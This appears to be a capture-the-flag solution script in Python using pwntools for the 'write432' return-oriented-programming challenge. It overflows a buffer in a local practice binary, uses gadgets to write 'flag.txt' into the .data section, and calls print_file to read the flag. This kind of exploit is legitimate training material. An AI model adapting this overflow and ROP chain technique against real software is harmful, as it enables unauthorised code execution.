from pwn import *



def convert_into_hex(word):
    '''
    convert string into hex in little endian 
    format
    '''
    new_w = []
    rev_word=word[::-1]
    for i in rev_word:
        
        new_w.append(hex(ord(i))[2:])

    el = "0x" + "".join(new_w)


    return p32(int(el,16))


word1 =  convert_into_hex("flag")
word2 =  convert_into_hex(".txt")


p = process("./write432")

padd= b'A'*44  # padding of 44 bytes before overwriting sEip 
jump_print_file = p32(0x80483d0)


pop_edi_pop_ebp = p32(0x080485aa) # gadget1 pop edi; pop ebp ; ret
mov_edi_ebp =  p32(0x08048543) # gadget2  mov [edi], ebp; ret
start_data = p32(0x804a018) #  start of  .data section 
start_data_plus4 =  p32(0x804a018+4) # start+4 of  .data section 
jump_print_file = p32(0x80483d0) # address of print_file function


# write "flag"  at .data

rop_chain=padd 
rop_chain+=pop_edi_pop_ebp 
rop_chain+=start_data
rop_chain+=word1
rop_chain+=mov_edi_ebp # gadget2  to   write 'flag'


# write .txt at .data + 4
rop_chain+=pop_edi_pop_ebp  
rop_chain+=start_data_plus4 
rop_chain+=word2
rop_chain+=mov_edi_ebp # gadget2  to  write '.txt' 


# jump to print_file
rop_chain+=jump_print_file
rop_chain+=b'AAAA' 
rop_chain+= start_data  # points on the start of .data 


p.sendlineafter(b">",rop_chain)
flag = (p.recvall().split(b'\n')[1]).decode()

print(flag)